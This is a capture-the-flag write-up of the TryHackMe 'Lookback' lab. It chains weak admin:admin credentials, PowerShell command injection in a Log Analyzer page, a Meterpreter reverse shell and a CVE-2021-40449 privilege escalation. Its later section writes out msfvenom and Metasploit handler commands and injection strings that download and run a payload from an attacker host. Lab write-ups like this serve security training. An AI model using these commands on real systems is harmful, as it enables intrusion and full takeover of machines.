<img width="1749" height="385" alt="image" src="https://github.com/user-attachments/assets/0b2b1739-60c7-46cf-b9ef-18f86e77a89f" />

# Tryhackme - Lookback

The Lookback company has just started the integration with Active Directory. Due to the coming deadline, the system integrator had to rush the deployment of the environment. Can you spot any vulnerabilities?

Sometimes to move forward, we have to go backward. So if you get stuck, try to look back!

### Start with Nmap

<img width="1345" height="603" alt="image" src="https://github.com/user-attachments/assets/f018aab9-d6e8-46ff-8af9-2a84663818c2" />

Important clues from the scan:
```
80    HTTP      Microsoft IIS 10.0
443   HTTPS     Outlook / OWA
3389  RDP       Microsoft Terminal Services
Hostname: WIN-12OU7A66M7.thm.local
```

First add the hostname properly:
```
sudo nano /etc/hosts
```
Add:
```
10.49.138.119 WIN-12OU7A66M7.thm.local WIN-12OU7A66M7 lookback.thm
```

I checked port 80 but there was nth there, so I check port 443 `https://WIN-12OU7A66M7.thm.local/owa`
 
<img width="1913" height="861" alt="image" src="https://github.com/user-attachments/assets/f0d88cdb-5ca2-480a-be7a-4fac705abbaa" />

That’s the OWA login page. Good sign — Exchange/Outlook is definitely alive. 🔥

After discovering the OWA/Exchange login, I tested a small set of common weak credentials. The pair `admin:admin` was accepted, confirming weak credential usage.
Nikto also identified/confirmed the weak credential issue, which helped validate that `admin:admin` was part of the intended path rather than only a lucky guess.

<img width="1915" height="865" alt="image" src="https://github.com/user-attachments/assets/9f8c7f8a-bd96-4e9b-b0e3-75c3f024a22c" />

`A mailbox couldn't be found for THM\admin`

That usually means:

`THM\admin exists and the password worked,
but this account has no Exchange mailbox.`

So `admin:admin` may actually be valid domain creds, just not valid for OWA mailbox access.

Directory enumeration was performed on port 80 using ffuf. The scan only revealed `/rpc`, which returned HTTP 401 Unauthorized. Since this did not provide a direct path forward, I continued enumeration on the HTTPS service.

<img width="1331" height="712" alt="image" src="https://github.com/user-attachments/assets/2e76e9cd-33ac-4e45-8027-11590d83dfbb" />
<br>

A separate HTTPS directory scan was then performed against the Exchange hostname. This revealed `/test`, an authenticated development interface that was not discovered during the HTTP scan.

<img width="1331" height="1593" alt="image" src="https://github.com/user-attachments/assets/e51d6157-4038-4dd7-bdd7-3430c589ca4a" />

I checked and got the first question flag:

<img width="1915" height="342" alt="image" src="https://github.com/user-attachments/assets/a89ddde8-abaa-4ef8-ac8b-1ff17f43bb48" />

Then I tried to type something in that box and click run:

<img width="868" height="241" alt="image" src="https://github.com/user-attachments/assets/ffd80716-2a23-4c93-a92d-33b29fa9a86b" />

This error is very useful, It tells us the backend is running PowerShell:
```
Get-Content('C:\Users\Administrator\Desktop\user.txt')
```
So this Log Analyzer is reading files using Get-Content. Your path worked as input, but the file path doesn’t exist.
Then I tested whether PowerShell wildcards were supported in the path input. Using `C:\Users\*\Desktop\user.txt`, the application expanded the wildcard across user profile directories and eventually disclosed the Second question user flag.

<img width="878" height="507" alt="image" src="https://github.com/user-attachments/assets/d3b0b20f-f547-4563-9847-99ca4784b862" />

<br>

Next I tried Powershell command Injection and the web app is running command as THM/admin:

<img width="917" height="259" alt="image" src="https://github.com/user-attachments/assets/10643140-33f6-426b-9961-13efb79e3a3f" />

<img width="900" height="415" alt="image" src="https://github.com/user-attachments/assets/13b9e6d1-3fff-4daa-999c-e720a2db3014" />

<img width="1329" height="498" alt="image" src="https://github.com/user-attachments/assets/04e3c3b1-f2bf-4c1e-aaaf-912021c00a7b" />

Important parts from groups are:

`IIS APPPOOL\DefaultAppPool
Mandatory Label\Medium Plus Mandatory Level`

So this is not a normal interactive admin shell. It is a web app / app pool context with thm\admin identity. That explains why some paths are denied.

<img width="897" height="426" alt="image" src="https://github.com/user-attachments/assets/be2aaddd-d78e-49ea-80f7-722a63bce294" />

<br>

Since we can do command injection, we can also second question user flag here.

<img width="971" height="377" alt="image" src="https://github.com/user-attachments/assets/77d9117d-1573-4647-b9b0-424c3bd7d32c" />

I spent some time enumerating the filesystem and following the room hint: “All the way back! Where did you start?” I checked the original Log Analyzer path, the web root, the /devel application source, and several likely flag locations. While this helped me understand how the application worked, it did not directly lead to the root flag.

At this point, I pivoted from file hunting to post-exploitation. Since command execution was confirmed, I generated a Meterpreter payload, hosted it on my machine, downloaded it through the command injection, and executed it to obtain a stable Meterpreter session. From there, I used Metasploit’s local exploit suggester and successfully escalated privileges to NT AUTHORITY\SYSTEM.

For Meterpreter, you need two separate things running:
```
Terminal 1: Metasploit handler listening for the reverse connection
Terminal 2: Python web server hosting shell.exe
```
Do it like this:
```
msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST YOUR_VPN_IP
set LPORT 8000
run
```
Generate payload:

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=YOUR_VPN_IP LPORT=8000 -f exe -o shell.exe
```
Host it:
```
python3 -m http.server 8080
```

Trigger from Log Analyzer:
```
'); powershell -c "iwr http://YOUR_VPN_IP:8080/shell.exe -OutFile C:\Windows\Temp\shell.exe"; #
```
In Log Analyzer — execute payload
```
'); C:\Windows\Temp\shell.exe; #
```
Then we check Terminal 1, the Metasploit handler. That’s where the shell should appear:

<img width="1246" height="63" alt="image" src="https://github.com/user-attachments/assets/fc9ef955-f595-415a-a213-69ffac75571b" />
<br>

Next i run local exploit:

<img width="1349" height="767" alt="image" src="https://github.com/user-attachments/assets/565095c9-45b4-400b-93ee-fa3792d690a0" />

I tested a few suggestd modules but the successful one was CVE-2021-40449, which opened a new Meterpreter session as NT AUTHORITY\SYSTEM.

<img width="1260" height="483" alt="image" src="https://github.com/user-attachments/assets/edc989f2-901c-4ee7-a79f-33bcafef8a81" />

<img width="1335" height="754" alt="image" src="https://github.com/user-attachments/assets/d59ef9b0-23f4-4496-8424-e36275a79463" />
<br>

And we got the root flag:

<img width="1348" height="134" alt="image" src="https://github.com/user-attachments/assets/e534776d-83e4-4e96-80e3-972631a7c541" />

<br>

### Attack chain

```text
1. Recon
   - Nmap showed only 80, 443, and 3389 open.
   - 443 hosted Exchange/OWA, while 80 did not reveal the main path.

2. Weak credential testing
   - Tested common/default credentials.
   - admin:admin was valid, but the account had limited access:
     - no mailbox
     - no useful RDP access
     - no ECP access

3. HTTPS directory enumeration
   - A separate HTTPS ffuf/Nikto scan revealed /test.
   - /test returned 401, meaning it existed but required authentication.

4. Access to /test
   - Logged in with admin:admin.
   - Found a Log Analyzer application and the service user flag.

5. File read through PowerShell wildcard
   - The app used PowerShell Get-Content to read files.
   - Using C:\Users\*\Desktop\user.txt allowed wildcard expansion across user profiles.
   - This disclosed the user flag.

6. Command injection
   - Broke out of the Get-Content command using:
     '); whoami; #
   - Confirmed command execution as THM\admin.

7. Stable shell
   - Basic reverse shell attempts were unreliable.
   - Generated a Meterpreter reverse TCP payload with msfvenom.
   - Downloaded and executed it through the command injection.
   - Got a Meterpreter session as THM\admin.

8. Privilege escalation
   - Ran Metasploit local exploit suggester.
   - Tested several suggested modules.
   - CVE-2021-40449 successfully opened a second Meterpreter session.

9. SYSTEM access
   - Interacted with the new session.
   - getuid confirmed NT AUTHORITY\SYSTEM.
   - Searched Administrator files and found the root flag in Administrator’s Documents.
```

### Key takeaways

```text
- Scan every web port separately. HTTP and HTTPS can expose different content.
- 401 is important: it often means “real path, authentication required.”
- Valid credentials are not always enough; admin:admin worked but had limited permissions.
- PowerShell wildcard expansion can be abused for file discovery/read.
- Browser-based command injection is useful, but a stable shell makes Windows privesc much easier.
- Metasploit local exploit suggester is noisy, so verify success with a new session and getuid.
- After becoming SYSTEM, search again. Files that were hidden or denied before may become readable.
```

One-line lesson:

```text
Don’t tunnel on the loudest service; enumerate every exposed surface and pivot once you have real execution.
```
